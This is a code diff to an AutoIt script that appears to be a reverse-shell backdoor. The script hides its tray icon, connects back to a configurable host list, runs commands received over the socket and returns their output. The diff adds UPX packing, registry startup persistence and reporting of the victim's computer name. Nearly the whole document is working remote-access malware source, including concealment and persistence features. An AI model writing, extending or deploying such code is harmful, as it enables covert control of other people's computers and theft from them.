@@ -1,5 +1,10 @@
+#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
+#AutoIt3Wrapper_Compression=4
+#AutoIt3Wrapper_UseUpx=y
+#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
 #include <AutoItConstants.au3>
 #include <String.au3>
+#include "_Startup.au3"
 
 Opt("TrayIconHide", 1)
 
@@ -9,8 +14,8 @@ Sleep(1000)
 TCPStartup()
 
 ;insert more host here
-Global $host_list[1] = ["127.0.0.1"]
-Global $port_list[1] = [6666]
+Global $host_list[] = ["127.0.0.1"]
+Global $port_list[] = [6666]
 ;
 
 Func send_cmd($pid, $cmd)
@@ -43,27 +48,40 @@ EndFunc
 
 Func socket_readline($sock)
 	$data = ""
+	$count = 0
 	While True
+		If $count > 10000 Then
+			SetError(1)
+			ExitLoop
+		EndIf
 		$c = TCPRecv($sock, 1)
-		if @error Then Return -1
-		if $c == _HexToString("0a") Then ExitLoop
+		If @error Then SetError(1)
+		If $c == _HexToString("0a") Then ExitLoop
 		$data &= $c
+		$count += 1
 	WEnd
 	Return $data
 EndFunc
+
+If Not _StartupRegistry_Exists() Then
+	_StartupRegistry_Install()
+EndIf
 
 ;Main loop
 While True
 	Do
 		$s = connect_back()
 	Until $s <> -1
-	TCPSend($s, "[Welcome]" & @CRLF)
+	TCPSend($s, "[Welcome] " & @ComputerName & @CRLF)
 
 	While True
 		$cmd = socket_readline($s)
-		if $cmd == -1 Then ExitLoop
 		send_cmd($pid, $cmd)
 		TCPSend($s, read_stdout($pid))
+		If @error Then
+			ExitLoop
+		EndIf
+		Sleep(500)
 	WEnd
 	Sleep(500)
 WEnd
